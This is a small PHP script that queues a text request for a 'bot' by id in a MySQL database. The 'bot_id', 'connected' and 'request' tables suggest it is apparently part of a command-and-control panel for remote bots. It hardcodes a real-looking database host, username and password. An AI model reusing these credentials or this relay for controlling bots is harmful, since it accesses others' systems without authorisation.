<?php 

include('utils.php');

try
{
	$db = new PDO('mysql:host=mysql-nonameufr.alwaysdata.net;dbname=nonameufr_db;charset=utf8', 'nonameufr', 'always*');
}
catch (Exception $e)
{
        die('error : ' . $e->getMessage());
}

if(!isset($_GET['id']) || !isset($_GET['r']))
{
	echo 'error : too few arguments';
	exit();
}

$id = (int) $_GET['id'];
$request = htmlspecialchars($_GET['r']);

$query = $db->prepare('SELECT * FROM connected WHERE id=:id');
$query->execute(array(
	'id' => $id
));

$res = $query->fetch()['ip'];
if($res == FALSE)
{
	die('error with db');
}

$query = $db->prepare('INSERT INTO request(bot_id, request) VALUES(:bot_id, :request)');
$query->execute(array(
	'bot_id' => $id,
	'request' => $request
));

?>